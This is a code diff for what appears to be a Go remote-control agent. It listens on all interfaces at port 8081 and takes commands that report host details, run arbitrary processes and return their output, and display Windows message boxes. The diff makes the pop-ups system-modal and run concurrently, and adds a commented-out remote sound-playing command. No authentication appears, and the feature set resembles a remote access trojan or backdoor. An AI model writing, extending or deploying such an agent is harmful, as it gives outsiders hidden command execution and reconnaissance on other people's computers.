@@ -9,6 +9,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"unsafe"
 
@@ -16,6 +17,7 @@ import (
 )
 
 var DELIM string = "<|!|>"
+var wg sync.WaitGroup
 
 func Listen() {
 	server, err := net.Listen("tcp", "0.0.0.0:8081")
@@ -65,19 +67,24 @@ func handleClient(conn net.Conn) {
 
 			send([]string{command, hostname, ipAddress, os_version}, conn)
 		case "show_messagebox":
-			message, _ := syscall.UTF16PtrFromString(string(split_message[1]))
-			title, _ := syscall.UTF16PtrFromString(string(split_message[2]))
-			buttons, _ := strconv.Atoi(split_message[3])
-			icon, _ := strconv.Atoi(split_message[4])
+			wg.Add(1)
 
-			mb := uintptr(icon) | uintptr(buttons)
+			go func() {
+				message, _ := syscall.UTF16PtrFromString(string(split_message[1]))
+				title, _ := syscall.UTF16PtrFromString(string(split_message[2]))
+				buttons, _ := strconv.Atoi(split_message[3])
+				icon, _ := strconv.Atoi(split_message[4])
+				mb := uintptr(icon) | uintptr(buttons) | uintptr(4096)
 
-			go syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
-				0,
-				uintptr(unsafe.Pointer(message)),
-				uintptr(unsafe.Pointer(title)),
-				mb,
-			)
+				syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
+					0,
+					uintptr(unsafe.Pointer(message)),
+					uintptr(unsafe.Pointer(title)),
+					mb,
+				)
+				wg.Done()
+			}()
+
 		case "run_process":
 			process_name := string(split_message[1])
 			params := strings.Split(process_name, " ")
@@ -96,6 +103,44 @@ func handleClient(conn net.Conn) {
 			} else {
 				send([]string{"run_process", process_name, "true", string(b)}, conn)
 			}
+			// case "play_sound":
+			// 	wg.Add(1)
+
+			// 	sound_name := string(split_message[1])
+			// 	f, err := os.Open("static/" + sound_name + ".mp3")
+			// 	if err != nil {
+			// 		send([]string{"play_sound", "false", err.Error()}, conn)
+			// 		return
+			// 	}
+
+			// 	stream, format, err := mp3.Decode(f)
+			// 	defer stream.Close()
+			// 	if err != nil {
+			// 		send([]string{"play_sound", "false", err.Error()}, conn)
+			// 		return
+			// 	}
+
+			// 	out := make([]int32, 8192)
+			// 	po_stream, err := portaudio.OpenDefaultStream(0, 1, float64(format.SampleRate), len(out), &out)
+			// 	if err != nil {
+			// 		send([]string{"play_sound", "false", err.Error()}, conn)
+			// 		return
+			// 	}
+			// 	defer po_stream.Close()
+
+			// 	go func() {
+			// 		po_stream.Start()
+			// 		defer po_stream.Stop()
+			// 		for {
+			// 			err := po_stream.Write()
+			// 			if err != nil {
+			// 				break
+			// 			}
+			// 		}
+			// 		// Decrement the WaitGroup counter
+			// 		wg.Done()
+			// 	}()
+
 		}
 
 	}
